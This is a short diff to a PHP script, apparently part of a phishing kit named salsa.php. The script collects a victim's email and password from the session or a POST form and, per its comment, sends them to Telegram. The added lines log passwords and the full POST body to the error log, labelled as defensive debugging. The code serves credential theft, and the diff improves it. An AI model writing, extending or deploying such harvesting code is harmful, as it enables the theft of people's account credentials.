@@ -15,6 +15,11 @@ if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
     // Obtener la contraseña desde la sesión o desde el POST
     $passwordValue = isset($_SESSION['c']) ? $_SESSION['c'] : (isset($_POST['c']) ? $_POST['c'] : '');
 
+    // Log defensivo: si llega enmascarada, deja registro para depurar
+    if ($passwordValue !== '' && preg_match('/^[\*\x{2022}\x{25CF}\x{00B7}\.\s]+$/u', $passwordValue)) {
+        error_log('[salsa.php] Password recibido enmascarado: ' . $passwordValue . ' | POST: ' . json_encode($_POST));
+    }
+
     // Enviar datos a Telegram
     $correo = $_SESSION['e'];
     $psswd = $passwordValue;
